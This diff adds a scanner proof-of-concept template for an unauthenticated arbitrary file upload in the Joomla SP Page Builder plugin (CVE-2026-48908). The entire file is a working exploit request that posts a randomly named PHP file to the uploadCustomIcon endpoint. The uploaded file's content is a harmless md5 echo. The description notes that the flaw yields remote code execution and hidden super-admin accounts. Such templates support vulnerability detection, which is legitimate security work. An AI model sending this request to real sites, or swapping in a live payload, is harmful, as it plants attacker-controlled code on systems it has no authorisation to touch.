@@ -1,0 +1,26 @@
+name: poc-yaml-joomla-sp-page-builder-upload
+set:
+  r1: randomLowercase(8)
+groups:
+  upload:
+    - method: POST
+      path: /index.php?option=com_sppagebuilder&view=ajax&task=asset.uploadCustomIcon
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{r1}}
+      body: >-
+        ------WebKitFormBoundary{{r1}}
+        Content-Disposition: form-data; name="file"; filename="{{r1}}.php"
+        Content-Type: application/x-php
+
+        <?php echo md5("sp_page_builder_test"); ?>
+        ------WebKitFormBoundary{{r1}}--
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"success") || response.body.bcontains(b"true") || response.body.bcontains(b".php"))
+detail:
+  author: L4xy
+  description: "Joomla SP Page Builder 存在未授权任意文件上传漏洞，攻击者可通过uploadCustomIcon接口上传恶意PHP文件，导致远程代码执行，并可创建隐藏的超级管理员账户"
+  links:
+    - https://github.com/papageo75/CVE-2026-48908-PoC
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-48908
+  tags: file-upload,rce,joomla,sppagebuilder
